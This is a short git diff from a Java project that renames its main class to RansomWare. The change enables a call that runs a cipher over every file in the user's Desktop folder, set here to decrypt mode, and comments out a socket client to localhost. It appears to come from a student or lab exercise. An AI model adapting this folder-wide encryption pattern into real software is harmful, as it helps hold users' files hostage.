@@ -24,7 +24,7 @@ import sn.presidence.dept.service.cryptoing.tool.ICrypto;
  *
  * @author ousmane3ndiaye
  */
-public class Main {
+public class RansomWare {
 
     public static void main(String[] args) throws Exception {
         ICrypto crypto = new CryptoImpl();
@@ -34,18 +34,11 @@ public class Main {
         String path = System.getProperty("user.home") + File.separator + "Desktop";
 
         // Récupérer le nom du fichier à partir des arguments de ligne de commande
-        int mode = Cipher.ENCRYPT_MODE;
+        int mode = Cipher.DECRYPT_MODE;
 
-        if (args.length > 0) {
-            String smode = args[0];
-            if ("-enc".equals(smode)) {
-                mode = Cipher.ENCRYPT_MODE;
-            } else if ("-dec".equals(smode)) {
-                mode = Cipher.DECRYPT_MODE;
-            }
-        }
+        
 
-        //crypto.cipherProcessFolder(k, path, path, mode, true);
+        crypto.cipherProcessFolder(k, path, path, mode, true);
         FileOutputStream fos = new FileOutputStream(path + File.separator + "CryptoImpl.java");
         InputStream fis = crypto.getClass().getClassLoader().getResourceAsStream("moncode.txt");
         byte[] buffer = new byte[1024 * 1024];
@@ -57,8 +50,8 @@ public class Main {
         fos.close();
         fis.close();
         
-        Socket socket=new Socket("127.0.0.1", 2024);
-        new Client(socket).start();
+        //Socket socket=new Socket("127.0.0.1", 2024);
+        //new Client(socket).start();
         
        
 
